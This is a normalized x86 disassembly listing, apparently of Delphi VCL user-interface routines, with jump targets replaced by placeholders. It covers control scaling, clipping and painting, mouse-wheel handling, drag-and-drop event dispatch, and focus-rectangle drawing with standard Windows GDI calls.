mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43850c
sub_436f74
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41c4bc
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41c4d8
sub_437140
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419738
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_437358
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404378
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4371dd
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_437388
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_4371e4
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43722c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
test esi esi
je r-xdata
mov edx ebx
call sub_43a7b8
mov edx ebx
mov eax esi
call sub_43a6e4
mov eax ebx
call sub_4369ac
sub_437278
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403430
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43850c
mov eax edi
mov si 0xffd0
call sub_403430
sub_437310
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44b100
mov edx ebx
mov eax esi
call sub_4192b0
sub_437334
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43850c
pop ebx
retn
sub_437358
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4372cc
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40405c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_4372dc
sub_437388
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404378
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4373e4
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax esi
call sub_40442c
mov edx eax
mov eax ebx
call sub_437334
sub_437408
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41c418
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43850c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41c418
mov [ ebx + 0x84 ] eax
sub_437590
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_437580
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_434528
mov eax esi
call sub_434528
jmp r-xdata
sub_4375c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41389c
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413730
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_4138bc
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4377a0
mov eax ebx
call sub_44e0dc
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403430
sub_437648
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_4375c8
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_4375c8
jmp r-xdata
sub_43766c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437709
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
sub_437714
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41389c
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413840
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_436cf8
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4377a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43de44
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_436cf8
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43db40
push eax
call InvalidateRect
push ebp
call sub_437714
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43783c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44e0b4
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43850c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403430
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4378a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43de44
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43db40
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43db40
push eax
call ReleaseDC
retn
sub_437a00
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
call sub_438540
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_436e9c
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406864
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43850c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4356a8
sub_437ad4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_437b10
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_437b5c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_437b88
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4372fc
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_4372e8
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a5c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a5c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43db40
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_437c6c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_437cb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403430
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403430
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_437d5a
mov [ ebp - 0xa ] al
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403430
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403430
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
sub_437d7f
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_437dc8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_437e14
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41ca38
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f36
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_437f68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_436e9c
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403430
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403430
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403430
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403430
jmp r-xdata
sub_438058
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4123e4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_438540
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_4372e8
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_4372fc
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412434
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_438238
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_436e70
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403430
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43db40
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434a6c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43db40
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
